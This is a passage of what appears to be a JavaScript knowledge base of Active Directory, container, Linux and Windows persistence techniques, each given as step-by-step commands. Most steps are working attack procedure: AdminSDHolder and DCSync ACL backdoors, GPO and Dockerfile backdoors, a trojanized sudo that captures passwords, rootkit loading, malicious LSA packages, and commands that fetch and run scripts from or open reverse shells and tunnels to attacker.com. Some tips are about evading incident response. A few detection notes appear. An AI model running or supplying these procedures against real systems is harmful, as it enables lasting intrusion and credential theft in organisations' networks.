        "Common Silver Ticket targets:\n# cifs/server: SMB file access\n# host/server: PsExec, scheduled tasks, WMI\n# http/server: IIS WinRM, Exchange\n# mssqlsvc/server: MSSQL Kerberos auth\n# wsman/server: PowerShell remoting (WinRM)\n$ ticketer.py -nthash HASH -domain-sid SID -domain domain.com -spn wsman/server.domain.com Administrator",
        "Silver Ticket advantages for persistence:\n# No DC interaction at time of use (stealthier than Golden Ticket)\n# Survives krbtgt rotation (only service account rotation invalidates)\n# Valid for 10 years by default\n# No logon events on DC (ticket used directly at service)\n# Downside: only works for one specific service/server"
      ]
    },
    {
      name: "AdminSDHolder Persistence",
      id: "T1098.adminsdholder",
      summary: "ACL propagation • SDProp • AdminSDHolder • ACE persistence",
      description: "Abuse the AdminSDHolder object to persist ACL entries that propagate to all protected accounts every 60 minutes",
      tags: ["AdminSDHolder", "SDProp", "ACL persistence", "T1098"],
      steps: [
        "Understand AdminSDHolder mechanism:\n# AdminSDHolder: template object in CN=System,DC=domain,DC=com\n# SDProp process runs every 60 minutes\n# Copies AdminSDHolder ACL to ALL protected groups and their members\n# Protected groups: DA, EA, Schema Admins, Account Operators, etc.\n# Persistence: add your ACE to AdminSDHolder → propagates to all protected accounts",
        "Add persistent ACE to AdminSDHolder:\n# Every 60 min, SDProp copies AdminSDHolder's ACL to ALL protected accounts (DA, EA, Schema Admins)\n# Once your ACE is on AdminSDHolder, it propagates continuously — IR cannot remove it without clearing AdminSDHolder\n$ dacledit.py -action write -target 'AdminSDHolder' -principal attacker -rights FullControl -dc-ip DC_IP domain.com/admin:pass\n# PowerView:\n$ Add-ObjectACL -PrincipalIdentity attacker -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' -Rights All\n# Verify the ACE was added:\n$ Get-ACL 'AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com' | Select -Expand Access | Where {$_.IdentityReference -match 'attacker'}",
        "Wait for SDProp propagation (60 min automatic, or trigger manually):\n# SDProp runs automatically every 60 minutes — just wait\n# After propagation: attacker GenericAll ACE appears on Domain Admins and ALL its members\n# This means: even if IR removes you from DA, you re-add yourself using this ACE\n# Manual trigger (requires DA, useful if you need access now):\n$ Invoke-Command -ScriptBlock { ([ADSI]'LDAP://CN=AdminSDHolder,CN=System,DC=domain,DC=com').SetInfo() }\n# Verify propagation worked — check DA group ACL:\n$ Get-ACL 'AD:CN=Domain Admins,CN=Users,DC=domain,DC=com' | Select -Expand Access | Where {$_.IdentityReference -match 'attacker'}",
        "Exploit propagated ACL for re-escalation after IR:\n# Scenario: IR removes attacker from Domain Admins\n# Within 60 min: SDProp re-adds attacker's GenericAll ACE to DA group\n# Use GenericAll to re-add yourself:\n$ net group 'Domain Admins' attacker /add /domain\n$ Add-ADGroupMember -Identity 'Domain Admins' -Members attacker\n# Or use GenericAll to reset another DA's password:\n$ Set-ADAccountPassword -Identity real_da -Reset -NewPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)\n# IR cannot stop this without cleaning AdminSDHolder FIRST — most blue teams don't know this\n# Proper IR remediation: clear AdminSDHolder ACL → then remove from DA → rotate krbtgt twice",
        "Detect AdminSDHolder abuse:\n$ Get-ACL 'AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com' | Select -ExpandProperty Access | Where {$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'}\n# Non-standard principals with write access = persistence\n# Blue team must clean AdminSDHolder ACL, not just protected group ACLs"
      ]
    },
    {
      name: "Machine Account Persistence",
      id: "T1136.machine",
      summary: "addcomputer • MachineAccountQuota • computer account backdoor",
      description: "Create or abuse machine accounts for persistent domain authentication that is often overlooked in incident response",
      tags: ["addcomputer", "MachineAccountQuota", "computer account", "T1136"],
      steps: [
        "Create machine account using MachineAccountQuota (no admin required):\n# MachineAccountQuota: how many computer accounts a regular domain user can create (default: 10)\n# Machine accounts look like: BACKDOOR$ — IT admins rarely audit them the same way as user accounts\n# Machine accounts have passwords that DON'T expire by default (unlike user accounts)\n$ addcomputer.py -computer-name 'BACKDOOR$' -computer-pass 'Backdoor@123!' domain.com/user:pass -dc-ip DC_IP\n# Verify quota before attempting:\n$ nxc ldap DC_IP -u user -p pass -M maq\n# Verify creation:\n$ Get-ADComputer 'BACKDOOR' -Properties WhenCreated",
        "Create machine account with elevated privileges:\n$ addcomputer.py -computer-name 'SYSSVC$' -computer-pass 'Service@123!' -method LDAPS domain.com/admin:pass -dc-ip DC_IP\n# With DA: create machine account with no quota limit\n# Add machine account to privileged groups:\n$ Add-ADGroupMember -Identity 'Domain Admins' -Members 'SYSSVC$'",
        "Use machine account for persistent access:\n$ getTGT.py domain.com/'BACKDOOR$':Backdoor@123! -dc-ip DC_IP\n$ export KRB5CCNAME=BACKDOOR$.ccache\n$ nxc smb DC_IP -u 'BACKDOOR$' -p 'Backdoor@123!'\n# Machine accounts don't expire passwords by default\n# Blend in with legitimate computer accounts",
        "Modify machine account password for access after reset:\n$ python3 machineaccountquota.py -u admin -p pass -d domain.com set --target 'EXISTING$' --password 'NewMachinePass@123' -dc-ip DC_IP\n# Requires: GenericWrite or machine account creator rights\n# Change existing machine account password for persistent control\n# Original machine may have service disruption",
        "Grant machine account DCSync rights (most powerful escalation):\n# DCSync doesn't touch the DC at all — uses legitimate replication protocol (MS-DRSR)\n# Required rights: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All on domain NC root\n# Short form: 'DCSync' rights in dacledit/PowerView = both rights at once\n$ dacledit.py -action write -target 'DC=domain,DC=com' -principal 'BACKDOOR$' -rights DCSync -dc-ip DC_IP domain.com/admin:pass\n# PowerView alternative:\n$ Add-ObjectACL -PrincipalIdentity 'BACKDOOR$' -TargetIdentity 'DC=domain,DC=com' -Rights DCSync\n# Now DCSync the krbtgt hash using BACKDOOR$ — persistent golden ticket capability:\n$ getTGT.py domain.com/'BACKDOOR$':'Backdoor@123!' -dc-ip DC_IP\n$ export KRB5CCNAME=BACKDOOR$.ccache\n$ secretsdump.py -k -no-pass domain.com/'BACKDOOR$'@DC_IP -just-dc-user krbtgt\n# IR misses this: computer accounts with DCSync rights are rarely audited\n# BloodHound query to check for it: MATCH (c:Computer)-[:GetChangesAll]->(d:Domain) RETURN c"
      ]
    },
    {
      name: "ADIDNS Time Bomb",
      id: "T1584.dns",
      summary: "Pre-register hostnames • future host takeover • DNS persistence",
      description: "Pre-register DNS records for hostnames that will be deployed in the future to intercept traffic when systems go live",
      tags: ["ADIDNS", "DNS time bomb", "pre-register", "T1584"],
      steps: [
        "Identify future hostnames from SCCM/AD deployment plans:\n# Check SCCM task sequences for new machine names\n# Review AD for prestaged computer accounts\n# Monitor job postings and IT infrastructure documents\n$ Get-ADComputer -Filter {Enabled -eq $false} -Properties Description | Select Name,Description\n# Disabled/prestaged computer accounts = planned future deployments",
        "Register DNS record before the host is deployed:\n$ python3 dnstool.py -u domain\\user -p pass -a add -r 'NEWSRV2026' -d ATTACKER_IP DC_IP\n$ python3 dnstool.py -u domain\\user -p pass -a add -r 'backupserver' -d ATTACKER_IP DC_IP\n# When the legitimate host is provisioned, DNS still points to attacker\n# Initial setup traffic goes to attacker machine",
        "Capture initial deployment credentials:\n# Set up fake SMB share on ATTACKER_IP\n$ impacket-smbserver share /tmp/share -smb2support\n# New server will try to authenticate during domain join / software install\n# Capture NTLMv2 hashes of machine account or admin\n$ responder -I eth0 -wrd",
        "Intercept deployment traffic for MITM:\n# Set up reverse proxy on ATTACKER_IP to forward to real infrastructure\n# Capture credentials, domain join packages, config files\n# Inject malicious payloads into software delivery streams\n$ mitmproxy -p 443 --ssl-insecure",
        "Maintain access after real host goes live:\n# Real host gets DNS name - admin discovers conflict\n# If attacker still controls DNS record: can redirect anytime\n# Delete/recreate record during windows of opportunity\n$ python3 dnstool.py -u domain\\user -p pass -a remove -r 'NEWSRV2026' DC_IP\n# Time access: remove before discovery, re-add when needed\n# Persistence through DNS control rather than endpoint"
      ]
    },
    {
      name: "GPO Backdoor",
      id: "T1484.gpo",
      summary: "SharpGPOAbuse • scheduled task • logon script • GPO persistence",
      description: "Maintain persistent code execution across the domain by embedding backdoors in Group Policy Objects",
      tags: ["GPO backdoor", "SharpGPOAbuse", "scheduled task", "logon script", "T1484"],
      steps: [
        "Add persistent computer startup task via GPO:\n$ SharpGPOAbuse.exe --AddComputerTask --TaskName 'WindowsUpdate' --Author 'NT AUTHORITY\\SYSTEM' --Command 'powershell.exe' --Arguments '-w h -enc BASE64_PAYLOAD' --GPOName 'Default Domain Policy'\n# Runs as SYSTEM on every computer at startup\n# Survives reboots, blends in as legitimate Windows Update task",
        "Add persistent user logon script via GPO:\n$ SharpGPOAbuse.exe --AddUserScript --ScriptName 'UserInit.bat' --ScriptContents 'powershell -w h -enc BASE64' --GPOName 'Default Domain Policy'\n# Executes for every user at logon in the domain\n# Script stored in SYSVOL — readable by all domain users",
        "Add immediate scheduled task (fires once, sets up persistence):\n$ SharpGPOAbuse.exe --AddComputerTask --TaskName 'OnetimeSetup' --Author 'NT AUTHORITY\\SYSTEM' --Command 'powershell.exe' --Arguments '-enc ADD_REGISTRY_KEY' --GPOName 'Default Domain Policy' --Force\n# One-time task adds registry run key or drops implant\n# Deletes itself after first execution → reduces forensic evidence",
        "Modify existing GPO script file in SYSVOL:\n$ ls \\\\DC_IP\\SYSVOL\\domain.com\\Policies\\{GUID}\\Machine\\Scripts\\Startup\\\n$ echo 'powershell -enc BASE64' >> \\\\DC_IP\\SYSVOL\\domain.com\\Policies\\{GUID}\\Machine\\Scripts\\Startup\\startup.bat\n# Append to existing startup script\n# Stealthier than creating new GPO\n# Look for writable GPO scripts with Get-GPPermissions",
        "Create entirely new malicious GPO and link it:\n$ New-GPO -Name 'SecurityUpdate' -Comment 'Microsoft Security Baseline'\n$ SharpGPOAbuse.exe --AddComputerTask --GPOName 'SecurityUpdate' --TaskName 'SecUpdate' --Command 'cmd.exe' --Arguments '/c payload.exe'\n$ New-GPLink -Name 'SecurityUpdate' -Target 'DC=domain,DC=com' -Enforced Yes\n# Link to domain root with Enforced = highest priority\n# Applies to all domain objects\n# Name resembles legitimate Microsoft policy"
      ]
    },
    {
      name: "Implant Internal Image",
      id: "T1525",
      summary: "Container image backdoor • VM template backdoor • AMI backdoor",
      description: "Modify container images or VM templates to include malicious code that executes when instances are launched",
      tags: ["container image", "VM template", "AMI", "T1525"],
      steps: [
        "Backdoor Docker base image:\n$ docker pull ubuntu:22.04\n$ docker run -it ubuntu:22.04 bash\n# Install backdoor, create new image:\n$ docker commit CONTAINER_ID attacker/ubuntu:22.04\n$ docker push attacker/ubuntu:22.04\n# If developers pull this image instead of official one",
        "Modify Dockerfile to add persistence:\n# Add to legitimate Dockerfile:\n> RUN curl -s http://attacker.com/backdoor.sh | bash\n> CMD ['/bin/sh', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &']\n# Every container started from this image calls back",
        "AWS AMI backdooring:\n$ aws ec2 create-image --instance-id i-compromised --name 'Golden-Image-v2'\n# Creates AMI from compromised running instance\n# All new EC2 instances launched from this AMI are backdoored",
        "Kubernetes admission controller backdoor:\n# Modify admission webhook to inject malicious containers\n$ kubectl apply -f malicious-webhook.yaml\n# Every new pod in namespace gets sidecar container\n# Sidecar has network access and can exfil data",
        "Container registry compromise:\n# Push backdoored image to private registry\n# Wait for CI/CD pipelines to pull and deploy\n# All production deployments become backdoored"
      ]
    },
    {
      name: "Scheduled Task - Container Orchestration Job",
      id: "T1053.007",
      summary: "Kubernetes CronJob • Docker cron • ECS scheduled task",
      description: "Create scheduled jobs in container orchestration platforms for persistent code execution",
      tags: ["Kubernetes CronJob", "ECS scheduled task", "container", "T1053"],
      steps: [
        "Kubernetes CronJob for persistence:\n$ cat << 'EOF' | kubectl apply -f -\napiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: system-update\nspec:\n  schedule: '*/5 * * * *'\n  jobTemplate:\n    spec:\n      template:\n        spec:\n          containers:\n          - name: updater\n            image: alpine\n            command: ['/bin/sh', '-c', 'curl attacker.com/sh | sh']\n          restartPolicy: OnFailure\nEOF\n# Runs every 5 minutes on any available node",
        "AWS ECS scheduled task:\n$ aws ecs run-task --cluster production --task-definition malicious-task --count 1 --launch-type FARGATE\n$ aws events put-rule --schedule-expression 'rate(5 minutes)' --name system-update\n$ aws events put-targets --rule system-update --targets 'Id=1,Arn=ecs-cluster-arn,...'\n# Runs every 5 minutes as ECS Fargate task",
        "Nomad periodic job:\n$ cat malicious.nomad\n> job 'system-update' {\n>   type = 'batch'\n>   periodic {\n>     cron = '*/5 * * * * *'\n>     prohibit_overlap = true\n>   }\n>   task 'update' {\n>     driver = 'exec'\n>     config { command = '/bin/sh'; args = ['-c', 'curl attacker.com/sh | sh'] }\n>   }\n> }\n$ nomad job run malicious.nomad",
        "Docker Swarm service for persistence:\n$ docker service create --name system-update --mode global alpine sh -c 'while true; do curl attacker.com/sh | sh; sleep 300; done'\n# --mode global: runs on EVERY node in the swarm",
        "Airflow DAG for data pipeline persistence:\n# Add malicious task to existing Airflow DAG\n# Or create new DAG that runs on schedule\n# Executes under Airflow service account which may have broad data access"
      ]
    },
    {
      name: "Valid Accounts - Default Accounts",
      id: "T1078.001",
      summary: "Default credentials • factory passwords • service accounts • admin/admin",
      description: "Use default or factory-set credentials that were never changed to maintain persistent access",
      tags: ["default creds", "factory password", "service accounts", "T1078"],
      steps: [
        "Enumerate default credentials on network devices:\n$ nxc smb 192.168.1.0/24 -u administrator -p 'Password123' --local-auth\n$ nmap -p 22,23,80,443 --script default-creds 192.168.1.0/24\n# Default cred databases: DefaultCreds-Cheat-Sheet, SecLists",
        "Check ILO/IPMI default credentials:\n$ ipmitool -H 192.168.1.10 -U admin -P admin chassis status\n# Default iLO: admin/admin, Administrator/blank\n# Default iDRAC: root/calvin\n# Out-of-band: persists through OS reinstall",
        "Database default credentials:\n$ mssqlclient.py SA:''@192.168.1.100  # Default blank SA\n$ mysql -h 192.168.1.100 -u root  # No password\n$ mongo 192.168.1.100  # MongoDB no-auth default\n# Database default creds provide data access + OS shell",
        "Application default credentials:\n$ curl http://192.168.1.100:8080/manager/html -u tomcat:s3cret\n# Tomcat Manager: admin/admin, tomcat/tomcat, tomcat/s3cret\n$ curl http://192.168.1.100:8161/admin -u admin:admin\n# ActiveMQ: admin/admin\n$ curl http://192.168.1.100:5601 -u elastic:changeme\n# Elasticsearch: elastic/changeme (old versions)",
        "Change default creds for persistence:\n$ passwd root\n# After gaining initial access with default creds\n# Keep original default cred AND set new one\n# Add SSH key or persistence mechanism before changing\n# Never rely solely on default creds for long-term access"
      ]
    },
    {
      name: "Compromise Client Software Binary",
      id: "T1554",
      summary: "Auto-updater hijack • software binary replace • client-side trojanize",
      description: "Replace or modify legitimate client software binaries to establish persistence",
      tags: ["binary replace", "auto-updater", "trojanize", "T1554"],
      steps: [
        "Identify auto-updating software:\n$ reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s | findstr -i 'update\\|auto'\n$ ls /etc/cron.d/ | grep update\n# Target: Chrome, Firefox, VLC, Zoom, Slack — auto-update on run\n# Or CI/CD tooling that downloads and runs scripts",
        "Replace executable in writable directory:\n$ icacls 'C:\\Program Files\\TargetApp\\' /T\n# Find apps where users have write permissions\n$ copy /y payload.exe 'C:\\Program Files\\TargetApp\\update.exe'\n# Next time auto-update runs: payload executes\n# Often runs as SYSTEM for system-wide installs",
        "Hijack update mechanism download URL:\n# App downloads update from predictable URL\n# DNS poisoning or ARP spoofing: redirect to attacker\n# Serve malicious binary signed with legitimate or forged cert\n# Target: apps using HTTP (not HTTPS) for updates",
        "Linux binary replacement:\n$ which python3\n$ cp /tmp/backdoor /usr/bin/python3\n# Replace commonly-used binaries with trojanized versions\n# Script drops new binary, appends original execution\n$ cat > /usr/bin/sudo << 'EOF'\n#!/bin/bash\n/tmp/capture_creds.sh \"$@\" &\n/usr/bin/sudo.real \"$@\"\nEOF\n# Capture sudo passwords transparently",
        "Package manager hook:\n# Add post-install script to package\n# Or: modify /etc/apt/apt.conf.d/ to run script on every update\n$ echo 'DPkg::Post-Invoke {\"curl -s http://attacker.com/persist.sh | bash\"; };' > /etc/apt/apt.conf.d/99persist\n# Runs after every apt install/upgrade"
      ]
    },
    {
      name: "Kernel Modules and Extensions",
      id: "T1547.006",
      summary: "LKM rootkit • kernel module persistence • macOS kext • eBPF",
      description: "Load malicious kernel modules or extensions for deep system persistence",
      tags: ["LKM", "kernel module", "rootkit", "eBPF", "T1547"],
      steps: [
        "Load malicious Linux kernel module:\n$ insmod /tmp/rootkit.ko\n# Kernel module: ring 0 access, can hide processes/files/network\n# Survives reboots if added to /etc/modules\n$ echo 'rootkit' >> /etc/modules\n$ cp /tmp/rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/",
        "eBPF persistence (modern, stealthy):\n# eBPF programs run in kernel sandbox — no module signing needed\n$ bpftool prog load rootkit.o /sys/fs/bpf/rootkit\n# Hook kprobes/uprobes for syscall interception\n# More stealthy than LKM: harder to detect with standard tools\n# Persists until removed from /sys/fs/bpf/",
        "Make LKM persistent across reboots:\n$ cp backdoor.ko /lib/modules/$(uname -r)/extra/\n$ depmod -a\n$ modprobe backdoor\n# Or direct /etc/modules entry\n$ echo 'backdoor' | tee -a /etc/modules\n# Loads on every boot before user space",
        "macOS kernel extension (kext) — legacy:\n# Modern macOS: System Integrity Protection (SIP) blocks unsigned kexts\n# Bypass: target with SIP disabled or use DriverKit\n$ kextload /Library/Extensions/backdoor.kext\n# Requires code signing on macOS 10.13+\n# DriverKit: user-space driver framework as alternative",
        "Detect kernel module persistence:\n# Detection: lsmod, /proc/modules, /sys/module\n# Rootkit hides itself by manipulating module list in kernel\n# Detect via discrepancy between /proc/modules and memory scan\n$ cat /proc/modules\n$ kmod list  # Alternative listing"
      ]
    },
    {
      name: "LSASS Driver Persistence",
      id: "T1547.008",
      summary: "LSA notification package • SSP • password filter • Mimikatz sekurlsa",
      description: "Register malicious Security Support Providers (SSPs) or LSASS plugins for credential capture and persistence",
      tags: ["LSA", "SSP", "LSASS driver", "T1547"],
      steps: [
        "Register malicious SSP (Security Support Provider):\n$ mimikatz.exe 'misc::memssp'\n# Injects mimilib.dll into lsass process memory\n# Logs all NTLM authentications to C:\\Windows\\System32\\mimilsa.log\n# Survives reboots if registered in registry",
        "Persistent SSP via registry:\n$ reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v 'Security Packages' /t REG_MULTI_SZ /d 'kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0malicious'\n# malicious.dll loaded into lsass on next boot\n# Intercepts all authentications indefinitely\n# Requires: compile malicious.dll implementing SpLsaModeInitialize",
        "Windows Notification Package (password capture):\n# Similar to password filter but for all auth types:\n$ reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa' /v 'Notification Packages' /t REG_MULTI_SZ /d 'scecli\\0malicious'\n# malicious.dll: PasswordNotify() called with cleartext on every change\n# Deployed in: HKLM registry, requires local admin + reboot",
        "WDigest enable for cleartext credential caching:\n$ reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n# Forces Windows to cache cleartext passwords in LSASS\n# Combined with sekurlsa::logonpasswords: harvest cleartext next logon\n# Modern Windows has this disabled by default — this re-enables it",
        "Monitor LSASS for credential harvesting:\n$ mimikatz.exe 'sekurlsa::logonpasswords'\n# After enabling WDigest: wait for user to log in\n$ while($true){ Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'; Start-Sleep 3600 }\n# Harvest credentials hourly — catches new logons"
      ]
    },
    {
      name: "External Remote Services - Persistence",
      id: "T1133.persist",
      summary: "Install AnyDesk • setup reverse SSH • RDP enable • SSH authorized_keys • VPN backdoor",
      description: "Establish persistent external remote access mechanisms for long-term environment re-entry",
      tags: ["AnyDesk", "reverse SSH", "RDP backdoor", "SSH keys", "T1133"],
      steps: [
        "Enable RDP and add firewall exception:\n$ reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f\n$ netsh advfirewall firewall add rule name='Remote Desktop' protocol=TCP dir=in localport=3389 action=allow\n$ net localgroup 'Remote Desktop Users' backdoor /add\n# Enable RDP, open firewall, add backdoor user to RDP group",
        "Persistent reverse SSH tunnel:\n# Create systemd service for auto-reconnecting reverse tunnel:\n$ cat > /etc/systemd/system/sshd-update.service << 'EOF'\n[Unit]\nDescription=SSH Update Service\n[Service]\nExecStart=/usr/bin/ssh -N -R 19999:localhost:22 -i /root/.ssh/tunnel_key tunnel@attacker.com -o ServerAliveInterval=60 -o ExitOnForwardFailure=yes\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=multi-user.target\nEOF\n$ systemctl enable --now sshd-update\n# Persistent inbound SSH access from attacker.com port 19999",
        "Autossh for resilient reverse tunnel:\n$ apt-get install -y autossh\n$ autossh -M 0 -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -N -R 2222:localhost:22 -i /root/.ssh/id_rsa attacker@pivot.attacker.com &\n# autossh: automatically reconnects if tunnel drops\n# -M 0: use built-in keepalive instead of monitoring port",
        "SSH ProxyJump chain for deep access:\n$ cat >> ~/.ssh/config << 'EOF'\nHost pivot\n  HostName pivot.attacker.com\n  User attacker\nHost target-internal\n  HostName 192.168.10.50\n  User root\n  ProxyJump pivot\nEOF\n$ ssh target-internal  # Direct access through pivot\n# One command = SSH through multiple hops",
        "VPN client auto-connect for persistent access:\n# Install OpenVPN client on compromised host:\n$ apt install -y openvpn && cp attacker.ovpn /etc/openvpn/client.conf\n$ systemctl enable --now openvpn@client\n# Host auto-connects to attacker VPN on boot\n# Full layer-3 access to compromised host's network segment"
      ]
    },
    {
      name: "Traffic Signaling",
      id: "T1205",
      summary: "Port knocking • Magic Packet • covert activation signal",
      description: "Use covert signals to trigger backdoor activation or firewall rule changes",
      tags: ["port knocking", "Magic Packet", "WOL", "T1205"],
      steps: [
        "Port knocking sequence setup (knockd):\n$ cat /etc/knockd.conf\n> [openSSH]\n> sequence = 7000,8000,9000\n> command = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\n> tcpflags = syn\n# Knock on ports in sequence to open firewall rule\n$ knock -v attacker.com 7000 8000 9000\n$ ssh root@attacker.com",
        "Raw socket port knocking:\n$ nmap -Pn --host-timeout 201 --max-retries 0 -p 7000,8000,9000 target.com\n# Rapid nmap scan triggers port knock sequence\n# Invisible to casual monitoring",
        "Wake-on-LAN / Magic Packet backdoor:\n$ python3 -c \"import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.sendto(bytes.fromhex('ff'*6+'MACMAC'*16), ('255.255.255.255',9))\"\n# Special UDP packet triggers backdoor activation\n# Malware listens for magic packet before activating",
        "Steganographic signal in HTTP traffic:\n# Embed activation command in specific HTTP headers\n# e.g., X-Request-ID: ACTIVATE:cmd_here\n# Malware monitors all incoming HTTP requests for signal",
        "ICMP echo covert channel:\n> // Listen for ICMP packets with specific payload\n> if (icmp_payload == MAGIC_VALUE) {\n>     activate_backdoor();\n> }\n# Backdoor remains dormant until signal received\n# Difficult to detect without deep packet inspection"
      ]
    }
  ]
};